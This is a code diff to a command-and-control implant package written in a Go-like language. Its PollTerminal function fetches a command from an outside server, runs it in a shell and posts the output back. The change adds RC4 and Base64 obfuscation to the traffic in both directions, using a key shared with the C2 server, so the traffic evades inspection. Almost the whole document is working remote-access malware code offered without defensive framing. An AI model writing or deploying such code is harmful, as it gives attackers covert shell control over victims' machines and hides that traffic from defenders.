@@ -1,4 +1,4 @@
-// Package c2 - terminal poll: GET command, shell, POST output.
+// Package c2 - terminal poll: GET command, shell, POST output (RC4+Base64 bodies).
 package c2
 
 import "std/runtime"
@@ -13,10 +13,8 @@ fn terminalURL(baseURL: *u8, agentID: *u8) -> (*u8, *u8) {
     }
     var base: *u8 = baseURL
     var n: u64 = __strlen(base)
-    // drop trailing slash on base
     if n > 0 {
         if *(base + n - 1) == 47 {
-            // copy without last slash
             var raw: *void
             var err0: *u8
             raw, err0 = runtime.Alloc(n)
@@ -47,13 +45,13 @@ fn terminalURL(baseURL: *u8, agentID: *u8) -> (*u8, *u8) {
     return strings.Append(mid2, agentID)
 }
 
-// PollTerminal performs one C2 cycle:
+// PollTerminal performs one C2 cycle with RC4+Base64 body obfuscation:
 //   GET  {base}/v1/terminal/{agentID}
-//   if 204 -> return success (no work)
-//   else run body as shell command, POST stdout to the same URL
+//   if 204 -> done
+//   else Open(body) -> shell -> Seal(stdout) -> POST
 //
-// err == 0 means the cycle finished (including 204). Network/shell failures return err.
-fn PollTerminal(baseURL: *u8, agentID: *u8) -> *u8 {
+// key/keyLen must match the C2 server -key.
+fn PollTerminal(baseURL: *u8, agentID: *u8, key: *u8, keyLen: u64) -> *u8 {
     url, err := terminalURL(baseURL, agentID)
     if err != 0 {
         return err
@@ -69,8 +67,6 @@ fn PollTerminal(baseURL: *u8, agentID: *u8) -> *u8 {
     if resp.status == 204 {
         return 0
     }
-
-    // Any non-204 with a body is treated as a command line.
     if resp.body == null {
         return 0
     }
@@ -78,22 +74,36 @@ fn PollTerminal(baseURL: *u8, agentID: *u8) -> *u8 {
         return 0
     }
 
-    out, err3 := process.ShellOutput(resp.body)
+    cmd, cmdN, err3 := Open(resp.body, key, keyLen)
     if err3 != 0 {
         return err3
     }
-    defer free(out)
-
-    var body: *u8 = null
-    var blen: u64 = 0
-    if len(out) > 0 {
-        body = &out[0]
-        blen = len(out)
+    defer runtime.Free(cmd)
+    if cmdN == 0 {
+        return 0
     }
 
-    post, err4 := net.Post(url, "text/plain", body, blen)
+    out, err4 := process.ShellOutput(cmd)
     if err4 != 0 {
         return err4
+    }
+    defer free(out)
+
+    var plain: *u8 = null
+    var plen: u64 = 0
+    if len(out) > 0 {
+        plain = &out[0]
+        plen = len(out)
+    }
+    sealed, err5 := Seal(plain, plen, key, keyLen)
+    if err5 != 0 {
+        return err5
+    }
+    defer runtime.Free(sealed)
+
+    post, err6 := net.Post(url, "text/plain", sealed, __strlen(sealed))
+    if err6 != 0 {
+        return err6
     }
     net.FreeResponse(post)
     return 0
